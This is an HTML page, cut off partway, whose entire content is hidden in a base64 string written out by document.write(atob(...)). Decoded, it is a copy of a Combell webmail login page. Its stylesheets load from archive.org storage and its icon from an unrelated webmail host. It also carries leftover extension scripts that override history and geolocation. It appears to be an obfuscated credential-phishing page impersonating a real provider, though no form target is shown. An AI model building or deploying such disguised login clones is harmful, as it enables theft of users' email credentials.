<!DOCTYPE html>
<html>
<head>

  <script>
  document.write(unescape(atob("PCFET0NUWVBFIGh0bWw+CjwhLS0gc2F2ZWQgZnJvbSB1cmw9KDAwMjgpaHR0cHM6Ly93ZWJtYWlsLmNvbWJlbGwuY29tLyAtLT4KPGh0bWwgbGFuZz0iZW4iIGNsYXNzPSIganMgY2hyb21lIHdlYmtpdCI+PHNjcmlwdD4KCiAgICB3aW5kb3dbU3ltYm9sLmZvcignTUFSSU9fUE9TVF9DTElFTlRfZXBwaW9jZW1obW5sYmhqcGxjZ2tvZmNpaWVnb21jb24nKV0gPSBuZXcgKGNsYXNzIFBvc3RDbGllbnQgewogICAgY29uc3RydWN0b3IobmFtZSwgZGVzdGluYXRpb24pIHsKICAgICAgICB0aGlzLm5hbWUgPSBuYW1lOwogICAgICAgIHRoaXMuZGVzdGluYXRpb24gPSBkZXN0aW5hdGlvbjsKICAgICAgICB0aGlzLnNlcnZlckxpc3RlbmVycyA9IHt9OwogICAgICAgIHRoaXMuYmdSZXF1ZXN0c0xpc3RlbmVycyA9IHt9OwogICAgICAgIHRoaXMuYmdFdmVudHNMaXN0ZW5lcnMgPSB7fTsKICAgICAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIChtZXNzYWdlKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBtZXNzYWdlLmRhdGE7CiAgICAgICAgICAgIGNvbnN0IGlzTm90Rm9yTWUgPSAhKGRhdGEuZGVzdGluYXRpb24gJiYgZGF0YS5kZXN0aW5hdGlvbiA9PT0gdGhpcy5uYW1lKTsKICAgICAgICAgICAgY29uc3QgaGFzTm90RXZlbnRQcm9wID0gIWRhdGEuZXZlbnQ7CiAgICAgICAgICAgIGlmIChpc05vdEZvck1lIHx8IGhhc05vdEV2ZW50UHJvcCkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChkYXRhLmV2ZW50ID09PSAnTUFSSU9fUE9TVF9TRVJWRVJfX0JHX1JFU1BPTlNFJykgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBkYXRhLmFyZ3M7CiAgICAgICAgICAgICAgICBpZiAodGhpcy5oYXNCZ1JlcXVlc3RMaXN0ZW5lcihyZXNwb25zZS5yZXF1ZXN0SWQpKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3Jlc3BvbnNlLnJlcXVlc3RJZF0ocmVzcG9uc2UucmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIHRoaXMuYmdSZXF1ZXN0c0xpc3RlbmVyc1tyZXNwb25zZS5yZXF1ZXN0SWRdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGRhdGEuZXZlbnQgPT09ICdNQVJJT19QT1NUX1NFUlZFUl9fQkdfRVZFTlQnKSB7CiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZSA9IGRhdGEuYXJnczsKICAgICAgICAgICAgICAgIGlmICh0aGlzLmhhc0JnRXZlbnRMaXN0ZW5lcihyZXNwb25zZS5ldmVudCkpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmJnRXZlbnRzTGlzdGVuZXJzW2RhdGEuaWRdKHJlc3BvbnNlLnBheWxvYWQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAodGhpcy5oYXNTZXJ2ZXJMaXN0ZW5lcihkYXRhLmV2ZW50KSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICB0aGlzLnNlcnZlckxpc3RlbmVyc1tkYXRhLmV2ZW50XShkYXRhLmFyZ3MpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBldmVudCBub3QgaGFuZGxlZDogJHtkYXRhLmV2ZW50fWApOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9CiAgICBlbWl0VG9TZXJ2ZXIoZXZlbnQsIGFyZ3MpIHsKICAgICAgICBjb25zdCBpZCA9IHRoaXMuZ2VuZXJhdGVVSUlEKCk7CiAgICAgICAgY29uc3QgbWVzc2FnZSA9IHsKICAgICAgICAgICAgYXJncywKICAgICAgICAgICAgZGVzdGluYXRpb246IHRoaXMuZGVzdGluYXRpb24sCiAgICAgICAgICAgIGV2ZW50LAogICAgICAgICAgICBpZCwKICAgICAgICB9OwogICAgICAgIHdpbmRvdy5wb3N0TWVzc2FnZShtZXNzYWdlLCBsb2NhdGlvbi5vcmlnaW4pOwogICAgICAgIHJldHVybiBpZDsKICAgIH0KICAgIGVtaXRUb0JnKGJnRXZlbnROYW1lLCBhcmdzKSB7CiAgICAgICAgY29uc3QgcmVxdWVzdElkID0gdGhpcy5nZW5lcmF0ZVVJSUQoKTsKICAgICAgICBjb25zdCByZXF1ZXN0ID0geyBiZ0V2ZW50TmFtZSwgcmVxdWVzdElkLCBhcmdzIH07CiAgICAgICAgdGhpcy5lbWl0VG9TZXJ2ZXIoJ01BUklPX1BPU1RfU0VSVkVSX19CR19SRVFVRVNUJywgcmVxdWVzdCk7CiAgICAgICAgcmV0dXJuIHJlcXVlc3RJZDsKICAgIH0KICAgIGhhc1NlcnZlckxpc3RlbmVyKGV2ZW50KSB7CiAgICAgICAgcmV0dXJuICEhdGhpcy5zZXJ2ZXJMaXN0ZW5lcnNbZXZlbnRdOwogICAgfQogICAgaGFzQmdSZXF1ZXN0TGlzdGVuZXIocmVxdWVzdElkKSB7CiAgICAgICAgcmV0dXJuICEhdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3JlcXVlc3RJZF07CiAgICB9CiAgICBoYXNCZ0V2ZW50TGlzdGVuZXIoYmdFdmVudE5hbWUpIHsKICAgICAgICByZXR1cm4gISF0aGlzLmJnRXZlbnRzTGlzdGVuZXJzW2JnRXZlbnROYW1lXTsKICAgIH0KICAgIGZyb21TZXJ2ZXJFdmVudChldmVudCwgbGlzdGVuZXIpIHsKICAgICAgICB0aGlzLnNlcnZlckxpc3RlbmVyc1tldmVudF0gPSBsaXN0ZW5lcjsKICAgIH0KICAgIGZyb21CZ0V2ZW50KGJnRXZlbnROYW1lLCBsaXN0ZW5lcikgewogICAgICAgIHRoaXMuYmdFdmVudHNMaXN0ZW5lcnNbYmdFdmVudE5hbWVdID0gbGlzdGVuZXI7CiAgICB9CiAgICBmcm9tQmdSZXNwb25zZShyZXF1ZXN0SWQsIGxpc3RlbmVyKSB7CiAgICAgICAgdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3JlcXVlc3RJZF0gPSBsaXN0ZW5lcjsKICAgIH0KICAgIGdlbmVyYXRlVUlJRCgpIHsKICAgICAgICByZXR1cm4gJ3h4eHh4eHh4LXh4eHgtNHh4eC15eHh4LXh4eHh4eHh4eHh4eCcucmVwbGFjZSgvW3h5XS9nLCBmdW5jdGlvbiAoYykgewogICAgICAgICAgICBjb25zdCByID0gTWF0aC5yYW5kb20oKSAqIDE2IHwgMCwgdiA9IGMgPT09ICd4JyA/IHIgOiAociAmIDB4MyB8IDB4OCk7CiAgICAgICAgICAgIHJldHVybiB2LnRvU3RyaW5nKDE2KTsKICAgICAgICB9KTsKICAgIH0KfSkoJ01BUklPX1BPU1RfQ0xJRU5UX2VwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uJywgJ01BUklPX1BPU1RfU0VSVkVSX2VwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uJyk8L3NjcmlwdD48c2NyaXB0PgogICAgY29uc3QgaGlkZU15TG9jYXRpb24gPSBuZXcgKGNsYXNzIEhpZGVNeUxvY2F0aW9uIHsKICAgIGNvbnN0cnVjdG9yKGNsaWVudEtleSkgewogICAgICAgIHRoaXMuY2xpZW50S2V5ID0gY2xpZW50S2V5OwogICAgICAgIHRoaXMud2F0Y2hJRHMgPSB7fTsKICAgICAgICB0aGlzLmNsaWVudCA9IHdpbmRvd1tTeW1ib2wuZm9yKGNsaWVudEtleSldOwogICAgICAgIGNvbnN0IGdldEN1cnJlbnRQb3NpdGlvbiA9IG5hdmlnYXRvci5nZW9sb2NhdGlvbi5nZXRDdXJyZW50UG9zaXRpb247CiAgICAgICAgY29uc3Qgd2F0Y2hQb3NpdGlvbiA9IG5hdmlnYXRvci5nZW9sb2NhdGlvbi53YXRjaFBvc2l0aW9uOwogICAgICAgIGNvbnN0IGNsZWFyV2F0Y2ggPSBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24uY2xlYXJXYXRjaDsKICAgICAgICBjb25zdCBzZWxmID0gdGhpczsKICAgICAgICBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24uZ2V0Q3VycmVudFBvc2l0aW9uID0gZnVuY3Rpb24gKHN1Y2Nlc3NDYWxsYmFjaywgZXJyb3JDYWxsYmFjaywgb3B0aW9ucykgewogICAgICAgICAgICBzZWxmLmhhbmRsZShnZXRDdXJyZW50UG9zaXRpb24sICdHRVQnLCBzdWNjZXNzQ2FsbGJhY2ssIGVycm9yQ2FsbGJhY2ssIG9wdGlvbnMpOwogICAgICAgIH07CiAgICAgICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLndhdGNoUG9zaXRpb24gPSBmdW5jdGlvbiAoc3VjY2Vzc0NhbGxiYWNrLCBlcnJvckNhbGxiYWNrLCBvcHRpb25zKSB7CiAgICAgICAgICAgIHJldHVybiBzZWxmLmhhbmRsZSh3YXRjaFBvc2l0aW9uLCAnV0FUQ0gnLCBzdWNjZXNzQ2FsbGJhY2ssIGVycm9yQ2FsbGJhY2ssIG9wdGlvbnMpOwogICAgICAgIH07CiAgICAgICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmNsZWFyV2F0Y2ggPSBmdW5jdGlvbiAoZmFrZVdhdGNoSWQpIHsKICAgICAgICAgICAgaWYgKGZha2VXYXRjaElkID09PSAtMSkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNvbnN0IHJlYWxXYXRjaElkID0gc2VsZi53YXRjaElEc1tmYWtlV2F0Y2hJZF07CiAgICAgICAgICAgIGRlbGV0ZSBzZWxmLndhdGNoSURzW2Zha2VXYXRjaElkXTsKICAgICAgICAgICAgcmV0dXJuIGNsZWFyV2F0Y2guYXBwbHkodGhpcywgW3JlYWxXYXRjaElkXSk7CiAgICAgICAgfTsKICAgIH0KICAgIGhhbmRsZShnZXRDdXJyZW50UG9zaXRpb25PcldhdGNoUG9zaXRpb24sIHR5cGUsIHN1Y2Nlc3NDYWxsYmFjaywgZXJyb3JDYWxsYmFjaywgb3B0aW9ucykgewogICAgICAgIGNvbnN0IHJlcXVlc3RJZCA9IHRoaXMuY2xpZW50LmVtaXRUb0JnKCdISURFX01ZX0xPQ0FUSU9OX19HRVRfTE9DQVRJT04nKTsKICAgICAgICBsZXQgZmFrZVdhdGNoSWQgPSB0aGlzLmdldFJhbmRvbUludCgwLCAxMDAwMDApOwogICAgICAgIHRoaXMuY2xpZW50LmZyb21CZ1Jlc3BvbnNlKHJlcXVlc3RJZCwgKHJlc3BvbnNlKSA9PiB7CiAgICAgICAgICAgIGlmIChyZXNwb25zZS5lbmFibGVkKSB7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uuc3RhdHVzID09PSAnU1VDQ0VTUycpIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBwb3NpdGlvbiA9IHRoaXMubWFwKHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzQ2FsbGJhY2socG9zaXRpb24pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZXJyb3IgPSB0aGlzLmVycm9yT2JqKCk7CiAgICAgICAgICAgICAgICAgICAgZXJyb3JDYWxsYmFjayhlcnJvcik7CiAgICAgICAgICAgICAgICAgICAgZmFrZVdhdGNoSWQgPSAtMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGNvbnN0IGFyZ3MgPSBbc3VjY2Vzc0NhbGxiYWNrLCBlcnJvckNhbGxiYWNrLCBvcHRpb25zXTsKICAgICAgICAgICAgICAgIGNvbnN0IHdhdGNoSWQgPSBnZXRDdXJyZW50UG9zaXRpb25PcldhdGNoUG9zaXRpb24uYXBwbHkobmF2aWdhdG9yLmdlb2xvY2F0aW9uLCBhcmdzKTsKICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSAnV0FUQ0gnKSB7CiAgICAgICAgICAgICAgICAgICAgdGhpcy53YXRjaElEc1tmYWtlV2F0Y2hJZF0gPSB3YXRjaElkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgaWYgKHR5cGUgPT09ICdXQVRDSCcpIHsKICAgICAgICAgICAgcmV0dXJuIGZha2VXYXRjaElkOwogICAgICAgIH0KICAgIH0KICAgIG1hcChyZXNwb25zZSkgewogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIGNvb3JkczogewogICAgICAgICAgICAgICAgYWNjdXJhY3k6IDIwLAogICAgICAgICAgICAgICAgYWx0aXR1ZGU6IG51bGwsCiAgICAgICAgICAgICAgICBhbHRpdHVkZUFjY3VyYWN5OiBudWxsLAogICAgICAgICAgICAgICAgaGVhZGluZzogbnVsbCwKICAgICAgICAgICAgICAgIGxhdGl0dWRlOiByZXNwb25zZS5sYXRpdHVkZSwKICAgICAgICAgICAgICAgIGxvbmdpdHVkZTogcmVzcG9uc2UubG9uZ2l0dWRlLAogICAgICAgICAgICAgICAgc3BlZWQ6IG51bGwsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHRpbWVzdGFtcDogRGF0ZS5ub3coKSwKICAgICAgICB9OwogICAgfQogICAgZXJyb3JPYmooKSB7CiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgY29kZTogMSwKICAgICAgICAgICAgbWVzc2FnZTogJ1VzZXIgZGVuaWVkIEdlb2xvY2F0aW9uJywKICAgICAgICB9OwogICAgfQogICAgZ2V0UmFuZG9tSW50KG1pbiwgbWF4KSB7CiAgICAgICAgbWluID0gTWF0aC5jZWlsKG1pbik7CiAgICAgICAgbWF4ID0gTWF0aC5mbG9vcihtYXgpOwogICAgICAgIHJldHVybiBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAobWF4IC0gbWluICsgMSkpICsgbWluOwogICAgfQp9KSgnTUFSSU9fUE9TVF9DTElFTlRfZXBwaW9jZW1obW5sYmhqcGxjZ2tvZmNpaWVnb21jb24nKQogIDwvc2NyaXB0PjxoZWFkPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KPHRpdGxlPkNvbWJlbGwgV2VibWFpbCA6OiBMb2cgaGllciBpbiBvcCB1dyB3ZWJtYWlsIGFjY291bnQgfCBDb21iZWxsIFdlYm1haWw8L3RpdGxlPgo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0iIiBpZD0idmlld3BvcnQiPgo8c3R5bGU+CgouZmFkZS1pbiB7CiAgYW5pbWF0aW9uOiBmYWRlSW4gZWFzZSAxMHM7CiAgLXdlYmtpdC1hbmltYXRpb246IGZhZGVJbiBlYXNlIDEwczsKICAtbW96LWFuaW1hdGlvbjogZmFkZUluIGVhc2UgMTBzOwogIC1vLWFuaW1hdGlvbjogZmFkZUluIGVhc2UgMTBzOwogIC1tcy1hbmltYXRpb246IGZhZGVJbiBlYXNlIDEwczsKfQpAa2V5ZnJhbWVzIGZhZGVJbiB7CiAgMCUgewogICAgb3BhY2l0eTowOwogIH0KICAxMDAlIHsKICAgIG9wYWNpdHk6MTsKICB9Cn0KCkAtbW96LWtleWZyYW1lcyBmYWRlSW4gewogIDAlIHsKICAgIG9wYWNpdHk6MDsKICB9CiAgMTAwJSB7CiAgICBvcGFjaXR5OjE7CiAgfQp9CgpALXdlYmtpdC1rZXlmcmFtZXMgZmFkZUluIHsKICAwJSB7CiAgICBvcGFjaXR5OjA7CiAgfQogIDEwMCUgewogICAgb3BhY2l0eToxOwogIH0KfQoKQC1vLWtleWZyYW1lcyBmYWRlSW4gewogIDAlIHsKICAgIG9wYWNpdHk6MDsKICB9CiAgMTAwJSB7CiAgICBvcGFjaXR5OjE7CiAgfQp9CgpALW1zLWtleWZyYW1lcyBmYWRlSW4gewogIDAlIHsKICAgIG9wYWNpdHk6MDsKICB9CiAgMTAwJSB7CiAgICBvcGFjaXR5OjE7Cn0KCiAuYmx1ciB7CiAgICAgICAgZm9udC1zaXplOiA0MHB4OwogICAgICAgIGNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDhweCAjMDAwOwogICAgICB9CgkgIAoJICAubXgxIHsKICBjb2xvcjogd2hpdGU7CiAgdGV4dC1zaGFkb3c6IDJweCAycHggNHB4ICMwMDAwMDA7Cn0KCgo8L3N0eWxlPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vcHJpdmF0ZWVtYWlsLmNvbS9hcHBzdWl0ZS9sb2dpbi1hc3NldHMvaW1hZ2VzLzUwZTY1NGU3ZGJlOGEwY2U3Nzc3NjQyOWNlNmQzZjE5LnN2ZyI+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHBzOi8vaWE5MDI3MDEudXMuYXJjaGl2ZS5vcmcvMTEvaXRlbXMvbWNvNzA5MDkwL3N0eWxlcy5taW4uY3NzIj4KCjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHBzOi8vaWE5MDI3MDEudXMuYXJjaGl2ZS5vcmcvMTEvaXRlbXMvbWNvNzA5MDkwL2ZyYW1ld29yay5jc3MiPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHBzOi8vaWE5MDI3MDEudXMuYXJjaGl2ZS5vcmcvMTEvaXRlbXMvbWNvNzA5MDkwL2pxdWVyeS11aS5taW4uY3NzIj48bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSJodHRwczovL2lhOTAyNzAxLnVzLmFyY2hpdmUub3JnLzExL2l0ZW1zL21jbzcwOTA5MC94ZGVza3RvcC5jc3MiPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHBzOi8vaWE5MDI3MDEudXMuYXJjaGl2ZS5vcmcvMTEvaXRlbXMvbWNvNzA5MDkwL2Rlc2t0b3AuY3NzIj48c2NyaXB0IHNyYz0iLi91aS5taW4uanMuZG93bmxvYWQiPjwvc2NyaXB0PjxzY3JpcHQgZWNvbW1lcmNlLXR5cGU9ImV4dGVuZC1uYXRpdmUtaGlzdG9yeS1hcGkiPigoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IG5hdGl2ZVB1c2hTdGF0ZSA9IGhpc3RvcnkucHVzaFN0YXRlOwogICAgICAgICAgICBjb25zdCBuYXRpdmVSZXBsYWNlU3RhdGUgPSBoaXN0b3J5LnJlcGxhY2VTdGF0ZTsKICAgICAgICAgICAgY29uc3QgbmF0aXZlQmFjayA9IGhpc3RvcnkuYmFjazsKICAgICAgICAgICAgY29uc3QgbmF0aXZlRm9yd2FyZCA9IGhpc3RvcnkuZm9yd2FyZDsKICAgICAgICAgICAgZnVuY3Rpb24gZW1pdFVybENoYW5nZWQoKSB7CiAgICAgICAgICAgICAgICBjb25zdCBtZXNzYWdlID0gewogICAgICAgICAgICAgICAgICAgIF9jdXN0b21fdHlwZV86ICdDVVNUT01fT05fVVJMX0NIQU5HRUQnLAogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIHdpbmRvdy5wb3N0TWVzc2FnZShtZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBoaXN0b3J5LnB1c2hTdGF0ZSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZVB1c2hTdGF0ZS5hcHBseShoaXN0b3J5LCBhcmd1bWVudHMpOwogICAgICAgICAgICAgICAgZW1pdFVybENoYW5nZWQoKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgaGlzdG9yeS5yZXBsYWNlU3RhdGUgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBuYXRpdmVSZXBsYWNlU3RhdGUuYXBwbHkoaGlzdG9yeSwgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgIGVtaXRVcmxDaGFuZ2VkKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGhpc3RvcnkuYmFjayA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZUJhY2suYXBwbHkoaGlzdG9yeSwgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgIGVtaXRVcmxDaGFuZ2VkKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGhpc3RvcnkuZm9yd2FyZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZUZvcndhcmQuYXBwbHkoaGlzdG9yeSwgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgIGVtaXRVcmxDaGFuZ2VkKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgfSkoKTwvc2NyaXB0PgoKCgoKCgoKPCEtLSBDdXN0b21pemVkIHNlY3Rpb24gLS0+Cgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vd2VibWFpbC5nZXJtYW5pYS1lbGVrdHJvbmlrLmRlL3NraW5zL2VsYXN0aWMvaW1hZ2VzL2xvZ28uc3ZnIj4KPGxpbmsgaHJlZj0iLi9jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjxzY3JpcHQgc3JjPSIuL2pxdWVyeS5taW4uanMuZG93bmxvYWQiPjwvc2NyaXB0PjxzY3JpcHQgc3JjPSIuL2NvbW1vbi5taW4uanMuZG93bmxvYWQiPjwvc2NyaXB0PjxzY3JpcHQgc3JjPSIuL2FwcC5taW4uanMuZG93bmxvYWQiPjwvc2NyaXB0PjxzY3JpcHQgc3JjPSIuL2pzdHoubWluLmpzLmRvd25sb2FkIj48L3NjcmlwdD48c2NyaXB0PgovKgogICAgICAgIEBsaWNzdGFydCAgVGhlIGZvbGxvd2luZyBpcyB0aGUgZW50aXJlIGxpY2Vuc2Ugbm90aWNlIGZvciB0aGUgCiAgICAgICAgSmF2YVNjcmlwdCBjb2RlIGluIHRoaXMgcGFnZS4KCiAgICAgICAgQ29weXJpZ2h0IChDKSBUaGUgUm91bmRjdWJlIERldiBUZWFtCgogICAgICAgIFRoZSBKYXZhU2NyaXB0IGNvZGUgaW4gdGhpcyBwYWdlIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlCiAgICAgICAgaXQgYW5kL29yIG1vZGlmeSBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlCiAgICAgICAgYXMgcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YKICAgICAgICB0aGUgTGljZW5zZSwgb3IgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KCiAgICAgICAgVGhlIGNvZGUgaXMgZGlzdHJpYnV0ZWQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZAogICAgICAgIHdhcnJhbnR5IG9mIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4KICAgICAgICBTZWUgdGhlIEdOVSBHUEwgZm9yIG1vcmUgZGV0YWlscy4KCiAgICAgICAgQGxpY2VuZCAgVGhlIGFib3ZlIGlzIHRoZSBlbnRpcmUgbGljZW5zZSBub3RpY2UKICAgICAgICBmb3IgdGhlIEphdmFTY3JpcHQgY29kZSBpbiB0aGlzIHBhZ2UuCiovCnZhciByY21haWwgPSBuZXcgcmN1YmVfd2VibWFpbCgpOwpyY21haWwuc2V0X2Vudih7InRhc2siOiJsb2dpbiIsInN0YW5kYXJkX3dpbmRvd3MiOmZhbHNlLCJsb2NhbGUiOiJlbl9VUyIsImRldmVsX21vZGUiOm51bGwsInJjdmVyc2lvbiI6MTA1MDMsImNvb2tpZV9kb21haW4iOiIiLCJjb29raWVfcGF0aCI6Ii8iLCJjb29raWVfc2VjdXJlIjp0cnVlLCJkYXJrX21vZGVfc3VwcG9ydCI6ZmFsc2UsInNraW4iOiJjb21iZWxsIiwiYmxhbmtwYWdlIjoic2tpbnMvY29tYmVsbC93YXRlcm1hcmsuaHRtbCIsInJlZnJlc2hfaW50ZXJ2YWwiOjYwLCJzZXNzaW9uX2xpZmV0aW1lIjo2MDAsImFjdGlvbiI6IiIsImNvbW1fcGF0aCI6Ii4vP190YXNrPWxvZ2luIiwiY29tcG9zZV9leHR3aW4iOmZhbHNlLCJkYXRlRm9ybWF0cyI6eyJwaHAiOiJZLW0tZCIsIm1vbWVudCI6IllZWVktTU0tREQiLCJkYXRlcGlja2VyIjoieXktbW0tZGQifSwiZG1Gb3JtYXRzIjp7InBocCI6Im0tZCIsIm1vbWVudCI6Ik1NLUREIiwiZGF0ZXBpY2tlciI6Im1tLWRkIn0sInRpbWVGb3JtYXRzIjp7InBocCI6Ikg6aSIsIm1vbWVudCI6IkhIOm1tIn0sInhwaG9uZSI6ZmFsc2UsInh0YWJsZXQiOmZhbHNlLCJ4bW9iaWxlIjpmYWxzZSwieGRlc2t0b3AiOnRydWUsInhkZXZpY2UiOiJkZXNrdG9wIiwidGltZXpvbmVPZmZzZXQiOjcyMDAsInhhc3NldHMiOlsiLi4veGZyYW1ld29yay9hc3NldHMvc2NyaXB0cy9mcmFtZXdvcmsubWluLmpzIiwiLi4veGZyYW1ld29yay9hc3NldHMvc3R5bGVzL2ZyYW1ld29yay5jc3MiLCJ4c2tpbjphc3NldHMvc2NyaXB0cy94c2tpbi5taW4uanMiLCJ4c2tpbjphc3NldHMvc2NyaXB0cy94ZGVza3RvcC5taW4uanMiLCJ4c2tpbjphc3NldHMvc3R5bGVzL3hkZXNrdG9wLmNzcyIsInhza2luOi4uLy4uL3NraW5zL2NvbWJlbGwvYXNzZXRzL2Rlc2t0b3AuY3NzIl0sInhza2luIjoiY29tYmVsbCIsInhwaG9uZV9za2luIjoiY29tYmVsbCIsInh0YWJsZXRfc2tpbiI6ImNvbWJlbGwiLCJ4ZGVza3RvcF9za2luIjoiY29tYmVsbCIsInhza2luX3R5cGUiOiJkZXNrdG9wIiwicmNwX3NraW4iOnRydWUsImRhdGVfZm9ybWF0IjoieXktbW0tZGQiLCJkYXRlX2Zvcm1hdF9sb2NhbGl6ZWQiOiJZWVlZLU1NLUREIiwieGNvbG9yIjoiNTg1ODU4IiwieHdhdGVybWFyayI6Ii4uLy4uL3BsdWdpbnMveHNraW4vYXNzZXRzL2ltYWdlcy93YXRlcm1hcmsucG5nIiwiYXBwc01lbnUiOiIiLCJyZXF1ZXN0X3Rva2VuIjoiS3lqRDBCOXlaSWdHY045emZSVE5WVG1oUnRvRjNJaEcifSk7CnJjbWFpbC5hZGRfbGFiZWwoeyJsb2FkaW5nIjoiTG9hZGluZy4uLiIsInNlcnZlcmVycm9yIjoiU2VydmVyIEVycm9yISIsImNvbm5lcnJvciI6IkNvbm5lY3Rpb24gRXJyb3IgKEZhaWxlZCB0byByZWFjaCB0aGUgc2VydmVyKSEiLCJyZXF1ZXN0dGltZWRvdXQiOiJSZXF1ZXN0IHRpbWVkIG91dCIsInJlZnJlc2hpbmciOiJSZWZyZXNoaW5nLi4uIiwid2luZG93b3BlbmVycm9yIjoiVGhlIHBvcHVwIHdpbmRvdyB3YXMgYmxvY2tlZCEiLCJ1cGxvYWRpbmdtYW55IjoiVXBsb2FkaW5nIGZpbGVzLi4uIiwidXBsb2FkaW5nIjoiVXBsb2FkaW5nIGZpbGUuLi4iLCJjbG9zZSI6IkNsb3NlIiwic2F2ZSI6IlNhdmUiLCJjYW5jZWwiOiJDYW5jZWwiLCJhbGVydHRpdGxlIjoiQXR0ZW50